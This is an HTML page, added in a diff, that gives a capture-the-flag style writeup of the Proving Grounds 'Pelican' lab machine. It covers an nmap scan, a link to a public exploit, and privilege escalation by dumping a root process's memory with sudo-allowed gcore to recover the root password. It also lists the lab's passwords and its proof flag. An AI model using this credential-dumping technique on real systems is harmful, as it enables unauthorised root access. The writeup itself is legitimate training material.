@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <meta name="description" content="Proving Grounds Pelican Writeup - Rachel Murphy" />
+  <title>PG: Pelican | Rachel Murphy</title>
+
+  <link rel="stylesheet" href="/assets/css/writeups.css">
+  <style>
+    img.screenshot {
+      max-width: 100%;
+      margin: 0.75rem 0;
+      border: 2px solid #39ff14;
+      border-radius: 6px;
+      display: block;
+    }
+    pre { background: rgba(15,23,36,0.9); padding: 1rem; border-radius: 6px; overflow-x: auto; }
+  </style>
+</head>
+<body>
+
+  <header>
+    <div class="wrap">
+      <h1>Pelican — Writeup</h1>
+      <p class="meta">Proving Grounds — Linux / Web Exploitation / Privilege Escalation</p>
+      <nav>
+        <ul class="main-nav">
+          <li><a href="/index.html">Home</a></li>
+          <li><a href="/writeups/index.html">Writeups</a></li>
+          <li><a href="/cheatsheets/cheatsheet.html">Cheatsheets</a></li>
+          <li><a href="/tools/index.html">Tools</a></li>
+          <li><a href="/about.html">About</a></li>
+        </ul>
+      </nav>
+    </div>
+  </header>
+
+  <main class="wrap">
+
+    <!-- Machine Summary -->
+    <section class="machine-summary">
+      <h2>Machine Overview</h2>
+      <p><strong>Difficulty:</strong> Intermediate</p>
+      <p><strong>Platform:</strong> Offensive Security Proving Grounds (Practice)</p>
+      <p><strong>Description:</strong> Pelican is a retired Linux VM from OffSec’s Proving Grounds Practice. Initial access involves finding web credentials and using a public exploit to get a shell as <code>charles</code>. Privilege escalation requires dumping process memory with <code>gcore</code> to recover the root password.</p>
+    </section>
+
+    <h2>Nmap</h2>
+    <pre><code>sudo nmap -sC -sV 192.168.247.98 -oN nmap-pelican</code></pre>
+    <img class="screenshot" src="../images/Pasted image 20250704141642.png" alt="nmap results">
+    <img class="screenshot" src="../images/Pasted image 20250704142509.png" alt="nmap results 2">
+
+    <h2>Web</h2>
+    <img class="screenshot" src="../images/Pasted image 20250704141854.png" alt="web screenshot">
+
+    <h2>Initial Access Credentials</h2>
+    <pre><code>charles / SupportDucklingDivision574</code></pre>
+    <img class="screenshot" src="../images/Pasted image 20250704142158.png" alt="credentials">
+    <p>SSH didn’t work. Used <a href="https://www.exploit-db.com/exploits/48654" target="_blank">Exploit-DB 48654</a> instead:</p>
+    <img class="screenshot" src="../images/Pasted image 20250704144314.png" alt="exploit run">
+    <img class="screenshot" src="../images/Pasted image 20250704144250.png" alt="exploit success">
+
+    <p>I am charles in /opt/zookeeper</p>
+
+    <h2>Privilege Escalation</h2>
+    <pre><code>sudo -l</code></pre>
+    <img class="screenshot" src="../images/Pasted image 20250704144503.png" alt="sudo -l output">
+    <img class="screenshot" src="../images/Pasted image 20250704144553.png" alt="sudo -l output 2">
+
+    <p>Use gcore to dump process memory:</p>
+    <img class="screenshot" src="../images/Pasted image 20250704154303.png" alt="linpeas hint">
+    <pre><code>sudo -u root /usr/bin/gcore -a -o /home/charles/output 494</code></pre>
+    <img class="screenshot" src="../images/Pasted image 20250704154414.png" alt="gcore output">
+
+    <p>Run strings to extract the root password:</p>
+    <pre><code>strings output.494 | grep -A 10 -B 10 root</code></pre>
+    <p>Password found: <code>ClogKingpinInning731</code></p>
+    <img class="screenshot" src="../images/Pasted image 20250704154604.png" alt="strings output">
+
+    <p>Switch to root:</p>
+    <pre><code>su root</code></pre>
+    <p>Got root:</p>
+    <img class="screenshot" src="../images/Pasted image 20250704154735.png" alt="root shell">
+
+    <p>Proof.txt:</p>
+    <pre><code>c7ada8c40b0a7f6af2a328c5d7263750</code></pre>
+
+  </main>
+</body>
+</html>
